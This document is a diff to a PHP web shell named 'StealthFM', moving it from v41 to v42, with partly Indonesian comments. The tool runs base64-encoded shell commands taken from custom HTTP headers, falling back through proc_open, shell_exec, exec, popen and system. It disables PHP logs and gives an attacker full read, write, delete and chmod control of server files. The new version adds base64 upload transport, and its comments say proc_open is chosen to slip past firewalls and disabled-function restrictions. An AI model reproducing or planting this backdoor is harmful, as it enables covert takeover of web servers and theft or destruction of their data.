@@ -1,6 +1,6 @@
 <?php
 // -------------------------------------------------------------------------
-// STEALTH FM V41 (MADE WITH LOVE + GHOST PROTOCOL)
+// STEALTH FM V42 (GHOST PROTOCOL + B64 TRANSPORT LAYER)
 // -------------------------------------------------------------------------
 
 // 1. STEALTH MODE: DISABLE PHP LOGS
@@ -35,6 +35,7 @@ $h_data = 'HTTP_X_DATA';
 $h_cmd  = 'HTTP_X_CMD';
 $h_tool = 'HTTP_X_TOOL';
 $h_step = 'HTTP_X_STEP'; 
+$h_enc  = 'HTTP_X_ENCODE'; // Header baru untuk deteksi enkripsi
 
 $root = realpath(__DIR__); 
 
@@ -129,21 +130,70 @@ if (isset($_SERVER[$h_act])) {
     }
 
     if ($action === 'read') { if (is_file($target)) echo file_get_contents($target); else echo "Err: Not a file"; exit; }
-    if ($action === 'save' || $action === 'upload') { $input = file_get_contents("php://input"); echo (file_put_contents($target, $input) !== false) ? "Success" : "Err: Write failed"; exit; }
+    
+    // --- V42 UPDATE: DECODE INPUT IF ENCODED ---
+    if ($action === 'save' || $action === 'upload') { 
+        $input = file_get_contents("php://input"); 
+        
+        // Cek header enkripsi
+        if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') {
+            $input = base64_decode($input);
+        }
+
+        echo (file_put_contents($target, $input) !== false) ? "Success" : "Err: Write failed"; 
+        exit; 
+    }
+    // -------------------------------------------
+
     if ($action === 'delete') { echo force_delete($target) ? "Deleted" : "Fail delete"; exit; }
     if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
     if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
     
     if ($action === 'cmd') {
         $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
-        // STEALTH: Prevent History
-        $cmd = "export HISTFILE=/dev/null; " . $cmd . " 2>&1"; 
+        
+        // Hapus 'export HISTFILE' agar kompatibel dengan shell CageFS/JailShell
+        // Pakai 2>&1 untuk menangkap error stderr
+        $cmd_exec = $cmd . " 2>&1";
         $out = ""; 
-        if(function_exists('shell_exec')) { $out = @shell_exec($cmd); }
-        elseif(function_exists('passthru')) { ob_start(); @passthru($cmd); $out = ob_get_clean(); }
-        elseif(function_exists('exec')) { $a=[]; @exec($cmd,$a); $out = implode("\n",$a); }
-        elseif(function_exists('popen')) { $h=@popen($cmd,'r'); if($h){ while(!feof($h))$out.=fread($h,1024); pclose($h); } }
-        echo $out ?: "[No Output]"; exit;
+        
+        // Prioritas 1: PROC_OPEN (Paling sering lolos firewall/disable_function)
+        if (function_exists('proc_open')) {
+            $descriptors = [
+                0 => ["pipe", "r"],  // stdin
+                1 => ["pipe", "w"],  // stdout
+                2 => ["pipe", "w"]   // stderr
+            ];
+            $process = proc_open($cmd, $descriptors, $pipes, $target); // $target = cwd
+            if (is_resource($process)) {
+                // Tulis stdin jika perlu (opsional)
+                fclose($pipes[0]); 
+                $out .= stream_get_contents($pipes[1]); 
+                $out .= stream_get_contents($pipes[2]); 
+                fclose($pipes[1]); fclose($pipes[2]);
+                proc_close($process);
+            }
+        }
+        // Fallback ke metode lain jika proc_open gagal/kosong
+        if (empty($out)) {
+            if(function_exists('shell_exec')) { $out = @shell_exec($cmd_exec); }
+            elseif(function_exists('passthru')) { ob_start(); @passthru($cmd_exec); $out = ob_get_clean(); }
+            elseif(function_exists('exec')) { $a=[]; @exec($cmd_exec,$a); $out = implode("\n",$a); }
+            elseif(function_exists('popen')) { $h=@popen($cmd_exec,'r'); if($h){ while(!feof($h))$out.=fread($h,1024); pclose($h); } }
+            elseif(function_exists('system')) { ob_start(); @system($cmd_exec); $out = ob_get_clean(); }
+        }
+
+        // Debugging: Jika masih kosong, cek apakah fungsi benar-benar aktif
+        if (empty($out) || strlen(trim($out)) === 0) {
+            $disabled = ini_get('disable_functions');
+            $out = "[No Output]\n\n--- DEBUG INFO ---\n";
+            $out .= "User: " . get_current_user() . "\n";
+            $out .= "Disabled Functions: " . ($disabled ? $disabled : "NONE") . "\n";
+            $out .= "Shell_exec exists: " . (function_exists('shell_exec') ? "YES" : "NO") . "\n";
+            $out .= "Proc_open exists: " . (function_exists('proc_open') ? "YES" : "NO");
+        }
+
+        echo $out; exit;
     }
 
     if ($action === 'tool') {
@@ -235,7 +285,7 @@ if (isset($_SERVER[$h_act])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>StealthFM v41</title>
+    <title>StealthFM v42</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
@@ -449,8 +499,8 @@ if (isset($_SERVER[$h_act])) {
 
     <div id="terminal-panel" style="display:none;">
         <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
-        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v41</div></div>
-        <div class="term-input-row"><span class="term-prompt">➜</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
+        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v42</div></div>
+        <div class="term-input-row"><span class="term-prompt">&#10140;</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
     </div>
     <div id="process-panel" style="display:none;">
         <div class="console-header"><span class="console-title"><i class="fas fa-cog fa-spin me-2"></i> SYSTEM OUTPUT</span><i class="fas fa-times panel-close" onclick="closeLog()"></i></div>
@@ -605,9 +655,11 @@ if (isset($_SERVER[$h_act])) {
         }); 
     }
 
+    // --- V42 UPDATE: ENCODE CONTENT B64 ---
     function saveFile() { 
         let content = editor.getValue(); 
-        api('save', currentFile, 'PUT', {}, content).then(r => r.text()).then(m => { 
+        let encoded = btoa(unescape(encodeURIComponent(content))); // UTF-8 SAFE B64
+        api('save', currentFile, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
             showToast(m); editModal.hide(); 
         }); 
     }
@@ -618,12 +670,14 @@ if (isset($_SERVER[$h_act])) {
         newFileModal.show();
     }
 
+    // --- V42 UPDATE: ENCODE NEW CONTENT B64 ---
     function submitNewFile() {
         let name = document.getElementById('new-filename').value;
         let content = document.getElementById('new-content').value;
         if (name) {
             let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name;
-            api('save', path, 'PUT', {}, content).then(r => r.text()).then(m => { 
+            let encoded = btoa(unescape(encodeURIComponent(content))); // UTF-8 SAFE B64
+            api('save', path, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
                 showToast("Created: " + name); 
                 newFileModal.hide();
                 loadDir(''); 
@@ -631,16 +685,28 @@ if (isset($_SERVER[$h_act])) {
         }
     }
 
+    // --- V42 UPDATE: READ FILE AS B64 BEFORE UPLOAD ---
     function uploadFile() { 
         let input=document.getElementById('uploadInput'); 
         if(!input.files.length) { showToast("Select a file first", "error"); return; }
         let btn=document.getElementById('btnUpload'); let old=btn.innerHTML; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>'; 
-        let path=currentPath ? currentPath + '/' + input.files[0].name : input.files[0].name; 
-        if(currentPath === '/') path = '/' + input.files[0].name; 
-        api('upload', path, 'PUT', {}, input.files[0]).then(r => r.text()).then(m => { 
-            showToast(m); input.value=''; btn.innerHTML=old; loadDir(''); 
-        }); 
+        let file = input.files[0];
+        let path=currentPath ? currentPath + '/' + file.name : file.name; 
+        if(currentPath === '/') path = '/' + file.name; 
+        
+        // USE FILEREADER TO GET BASE64
+        let reader = new FileReader();
+        reader.onload = function(e) {
+            // strip "data:xxx;base64," prefix
+            let content = e.target.result.split(',')[1];
+            api('upload', path, 'PUT', {'X-Encode': 'b64'}, content)
+                .then(r => r.text())
+                .then(m => { showToast(m); input.value=''; btn.innerHTML=old; loadDir(''); })
+                .catch(() => { showToast("Upload Failed", "error"); btn.innerHTML=old; });
+        };
+        reader.readAsDataURL(file);
     }
+    // ------------------------------------------------
 
     function deleteItem(name) { 
         if(confirm(`Del ${name}?`)) { 
@@ -681,7 +747,7 @@ if (isset($_SERVER[$h_act])) {
         if (e.key === 'Enter') {
             let cmd = this.value; if(!cmd) return;
             let outDiv = document.getElementById('term-output');
-            outDiv.innerHTML += `<div><span style="color:#c586c0;">➜</span> <span style="color:#d4d4d4;">${cmd}</span></div>`;
+            outDiv.innerHTML += `<div><span style="color:#c586c0;">&#10140;</span> <span style="color:#d4d4d4;">${cmd}</span></div>`;
             this.value = ''; outDiv.scrollTop = outDiv.scrollHeight;
             api('cmd', currentPath, 'GET', { 'X-Cmd': btoa(cmd) }).then(r => r.text()).then(res => { outDiv.innerHTML += `<div style="color:#9cdcfe; margin-bottom:10px;">${res}</div>`; outDiv.scrollTop = outDiv.scrollHeight; });
         }
